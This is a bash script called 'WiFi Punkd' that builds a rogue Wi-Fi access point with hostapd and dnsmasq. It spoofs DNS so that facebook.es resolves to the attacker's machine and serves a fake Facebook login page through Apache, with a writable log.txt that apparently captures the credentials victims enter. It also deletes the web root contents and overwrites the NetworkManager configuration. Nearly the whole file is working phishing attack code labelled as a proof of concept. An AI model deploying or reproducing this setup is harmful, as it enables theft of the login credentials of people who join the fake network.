#!/bin/bash

if [[ $(id -u) != "0" ]];
then
	printf "This program needs root privileges\n"
	exit
fi

rm -r /tmp/wifipunkd 2>/dev/null

###### Setting global variables ################
ip_address="10.0.0.1"                          #
program_path="/tmp/wifipunkd"                  #
hostapd_conf="$program_path/hostapd.conf"      #
dnsmasq_conf="$program_path/dnsmasq.conf"      #
fakehostfile="$program_path/fakehost"          #
mkdir "$program_path" 2>/dev/null              #
################################################

function _HELP_(){
	printf "%s\n" "Usage bash wifi-punkd.sh -i <interface> -ssid <name> -c <channel> -view <hidden/visible> -sec <open/password>"
	printf "%s\n" "Example:"
	printf "%s\n" "bash wifi-punkd.sh -i wlan0 -ssid Wifi -c 6 -view visible -sec open"
	exit
}


function _Header_(){

	printf "\e[1;33m"
cat << EOF
         ___ .___ ._______.___               
.___    |   |: __|:_ ____/: __|              
:   | /\|   || : ||   _/  | : |              
|   |/  :   ||   ||   |   |   |              
|   /       ||   ||_. |   |   |              
|______/|___||___|  :/    |___|              
        :           :                        
        :                                    
                                             
._______ .____     .______  .____/\ .______  
: ____  ||    |___ :      \ :   /  \:_ _   \ 
|    :  ||    |   ||       ||.  ___/|   |   |
|   |___||    :   ||   |   ||     \ | . |   |
|   |    |        ||___|   ||      \|. ____/ 
|   |    |. _____/     |___||___\  / :/      
|___|    :/                     \/  :       
         :                                  
                    
EOF
	printf "\e[0m"
}


function _Check_Required_Programs_(){

        check_programs=(xterm hostapd dnsmasq apache2 macchanger)
        for i in ${check_programs[*]};
        do
                if ! command -v "$i" &> /dev/null
                then
                        printf "$i is not installed\nRun apt-get install $i -y\n"
			exit
                fi
        done

}

function _regulate_macchanger_auto_change_mac_(){
cat << EOF
[main]
plugins=ifupdown,keyfile

[ifupdown]
managed=false

[device]
wifi.scan-rand-mac-address=no
EOF
}


function _WIFI_PUNKD_STATUS_(){

	getmac=$(macchanger -s "$wireless_interface" | grep Current | awk '{print $3 " " $4 " " $5 " " $6 " "}')
	printf "\e[1mInterface:\e[0m $wireless_interface\n"
	printf "\e[1mMAC:\e[0m $getmac\n"
	printf "\e[1mSSID:\e[0m $ssidname\n"
	printf "\e[1mChannel:\e[0m $channelnumber\n"
	printf "\e[1mSSID visibility:\e[0m $hidenvis\n"
	printf "\e[1mSecurity:\e[0m $openpass\n"
	if [ "$openpass" == "password" ];
	then
		printf "\e[1mPassword:\e[0m $enterpass\n"
	fi
}

function _Deploy_Fake_FB_Poc_(){
	######################## DEPLOYING FAKE FB SERVER POC
	#### COPYING FAKE FB POC to apache folders and enabling log.txt file
	cp -r $PWD/fake_fb/* /var/www/html/

	touch /var/www/html/log.txt
	chown www-data:www-data /var/www/html/log.txt
	#####################################################
}

function _START_APACHE_AND_START_WIFIPUNKD_(){
	########### START APACHE2 AND START WIFI PUNKD
	printf "\n[\e[1;31m!\e[0m] \e[1mWARNING\e[0m [\e[1;31m!\e[0m]\n"
	printf "Apache Server needs delete /var/www/html/ folder contents\n"
	read -p $'Type \e[1mstart\e[0m to launch \e[1mWiFi Punkd\e[0m: ' confirm
	if [ "$confirm" == "start" ]
	then
		rm -r /var/www/html/* 2>/dev/null
		clear
		_Header_
		_WIFI_PUNKD_STATUS_
		_Deploy_Fake_FB_Poc_
		printf -- "\n[\e[0;32m+\e[0m] Starting apache server\e[0m\n"
		printf -- "[\e[0;32m+\e[0m] Enabling Fake Facebook login page POC\e[0m\n"
		sudo service apache2 start
	else
		printf -- "\nClosing WiFi Punkd\n"
		exit
	fi

}


function _Launch_Hostapd_and_Dnsmasq_(){
	########### START HOSTAPD AS FAKE AP
	xterm -e hostapd "$hostapd_conf" &
	##############################################

	printf "[\e[0;32m+\e[0m] \e[1mWiFi Punkd\e[0m is up\e[0m\n"
	######### START DHCP SERVER
	xterm -e dnsmasq -C "$dnsmasq_conf" -h -H "$fakehostfile" -d

}


if [[ $(grep 'wifi.scan-rand-mac-address=no' /etc/NetworkManager/NetworkManager.conf) == "" ]];
then
        printf "\nUpdating /etc/NetworkManager/NetworkManager.conf to avoid random mac changes in WiFi Punkd\n"
        _regulate_macchanger_auto_change_mac_ > /etc/NetworkManager/NetworkManager.conf
	printf "Please re-launch wifi-punkd.sh\n"
	exit
fi



_Check_Required_Programs_



function create_basic_hostapd(){
###################################################################################
#### HOSTAPD will be up with the interface that isnt connected to the internet ####
###################################################################################
cat << EOF > $hostapd_conf
interface=$wireless_interface
driver=nl80211
ssid=$ssidname
hw_mode=g
channel=$channelnumber
macaddr_acl=0
EOF
}


if [[ "$1" == "-i" ]] && [[ "$3" == "-ssid" ]] && [[ "$5" == "-c" ]] && [[ "$7" == "-view" ]] && [[ "$9" == "-sec" ]] && [[ "${10}" ]]
then

	wireless_interface="$2"
	ssidname="$4"
	channelnumber="$6"
	hidenvis="$8"
	openpass="${10}"
	enterpass="${11}"

	create_basic_hostapd

	if [[ "$8" == "visible" ]]
	then
		printf "ignore_broadcast_ssid=0\n" >> "$hostapd_conf"
	fi

	if [[ "$8" == "hidden" ]]
	then
		printf "ignore_broadcast_ssid=1\n" >> "$hostapd_conf"
	fi


	if [[ "${10}" == "password" ]] && [[ -z "${11}" ]]
	then
        	echo "-sec password flag needs a value"
		printf "Example: bash rogueap.sh -i wlan0 -ssid Wifi -c 6 -view visible -sec password MySeCrEtPasSwoRd\n"
		exit
	fi

	if [[ "${10}" == "password" ]] && [[ "${11}" ]]
	then
        	enterpass="${11}"
        	printf "auth_algs=1\n" >> "$hostapd_conf"
        	printf "wpa=2\n" >> "$hostapd_conf"
        	printf "wpa_passphrase=$enterpass\n" >> "$hostapd_conf"
        	printf "wpa_key_mgmt=WPA-PSK\n" >> "$hostapd_conf"
        	printf "rsn_pairwise=CCMP\n" >> "$hostapd_conf"
	fi


else

	_HELP_

fi


########################################################
######## DNSMASQ CONFIG (interface,dhcp,dns)    ########
########################################################
cat << EOF > $dnsmasq_conf
interface=$wireless_interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,$ip_address
dhcp-option=6,$ip_address
server=8.8.8.8

resolv-file=/tmp/wifipunkd/custom_resolv.conf
EOF

###############################
### CUSTOM_RESOLV.CONF FILE ###
###############################
printf "nameserver $ip_address\n" > /tmp/wifipunkd/custom_resolv.conf


################################
#### CREATING FAKEHOST FILE ####
################################
cat << EOF > $fakehostfile
$ip_address facebook.es
$ip_address www.facebook.es
EOF


###########################
##### SETTING APACHE2 #####
###########################
cat << EOF > /etc/apache2/ports.conf
## If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen $ip_address:80

<IfModule ssl_module>
        Listen 443
</IfModule>

<IfModule mod_gnutls.c>
        Listen 443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
EOF

########################
#### SETTING ROUTE #####
########################
ifconfig "$wireless_interface" "$ip_address" netmask 255.255.255.0

_START_APACHE_AND_START_WIFIPUNKD_
_Launch_Hostapd_and_Dnsmasq_
